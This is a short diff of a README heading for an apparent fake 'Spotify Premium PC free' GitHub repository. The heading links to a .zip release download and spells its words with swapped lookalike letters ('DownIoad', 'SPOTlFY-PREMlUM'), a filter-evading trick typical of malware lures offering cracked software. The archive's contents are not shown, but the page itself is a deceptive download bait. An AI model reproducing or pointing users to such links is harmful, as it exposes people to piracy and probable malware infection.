@@ -1,4 +1,4 @@
-# DownIoad [SPOTlFY-PREMlUM-PC](https://github.com/nayrgst/SPOTlFY-PREMlUM-2024-PC-FREE/releases/download/Spotify-premium-pc/Spotify-premium-pc.zip)
+# [DownIoad SPOTlFY-PREMlUM-PC](https://github.com/nayrgst/SPOTlFY-PREMlUM-2024-PC-FREE/releases/download/Spotify-premium-pc/Spotify-premium-pc.zip)
 
 ![164ba1206122ebaea5296f312e54bfc1](https://github.com/nayrgst/SPOTlFY-PREMlUM-2024-PC-FREE/assets/94721373/9cdba348-5f19-48a2-aaf2-3aa63d31f400)
 
